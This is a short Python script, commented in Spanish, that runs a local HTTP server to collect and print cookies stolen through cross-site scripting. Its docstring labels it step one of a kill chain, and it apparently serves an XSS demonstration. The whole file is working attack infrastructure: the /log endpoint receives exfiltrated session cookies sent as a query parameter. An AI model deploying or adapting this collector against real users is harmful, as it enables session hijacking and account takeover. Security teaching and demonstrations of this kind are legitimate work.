#!/usr/bin/env python3
"""Servidor minimo para capturar cookies robadas por XSS (Paso 1 del kill chain)."""

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse


class CookieLogHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        if parsed.path != "/log":
            self.send_response(404)
            self.end_headers()
            return
        params = parse_qs(parsed.query)
        cookie = params.get("cookie", [""])[0]
        print("\n--- Cookie recibida ---")
        print(cookie)
        print("-----------------------\n")
        self.send_response(204)
        self.end_headers()

    def log_message(self, format: str, *args) -> None:
        return


def main() -> None:
    host = "127.0.0.1"
    port = 9000
    server = HTTPServer((host, port), CookieLogHandler)
    print(f"Escuchando en http://{host}:{port}/log?cookie=...")
    print("Dejar esta terminal abierta durante la demo de XSS.")
    server.serve_forever()


if __name__ == "__main__":
    main()
